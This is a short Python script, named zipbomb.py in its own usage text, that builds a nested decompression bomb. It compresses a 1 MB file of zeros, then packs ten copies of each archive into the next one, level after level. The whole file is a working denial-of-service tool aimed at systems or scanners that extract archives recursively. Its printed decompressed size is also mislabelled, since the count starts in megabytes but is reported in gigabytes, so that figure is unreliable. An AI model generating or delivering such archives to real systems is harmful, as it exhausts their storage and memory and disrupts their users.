import zlib
import zipfile
import shutil
import os
import sys
import time

def get_file_size(filename):
    st = os.stat(filename)
    return st.st_size

def generate_dummy_file(filename, size):
    with open(filename, 'w') as dummy:
        dummy.write('0' * (size * 1024 * 1024))

def get_filename_without_extension(name):
    return name[:name.rfind('.')]

def get_extension(name):
    return name[name.rfind('.') + 1:]

def compress_file(infile, outfile):
    with zipfile.ZipFile(outfile, mode='w', allowZip64=True) as zf:
        zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)

def make_copies_and_compress(infile, outfile, n_copies):
    with zipfile.ZipFile(outfile, mode='w', allowZip64=True) as zf:
        for i in range(n_copies):
            f_name = '%s-%d.%s' % (get_filename_without_extension(infile), i, get_extension(infile))
            shutil.copy(infile, f_name)
            zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
            os.remove(f_name)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage:')
        print(' zipbomb.py n_levels out_zip_file')
        sys.exit()
    n_levels = int(sys.argv[1])
    out_zip_file = sys.argv[2]
    dummy_name = 'dummy.txt'
    start_time = time.time()
    generate_dummy_file(dummy_name, 1)
    level_1_zip = '1.zip'
    compress_file(dummy_name, level_1_zip)
    os.remove(dummy_name)
    decompressed_size = 1
    for i in range(1, n_levels + 1):
        make_copies_and_compress('%d.zip' % i, '%d.zip' % (i + 1), 10)
        decompressed_size *= 10
        os.remove('%d.zip' % i)
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename('%d.zip' % (n_levels + 1), out_zip_file)
    end_time = time.time()
    print('Compressed File Size: %.2f KB' % (get_file_size(out_zip_file) / 1024.0))
    print('Size After Decompression: %d GB' % decompressed_size)
    print('Generation Time: %.2fs' % (end_time - start_time))
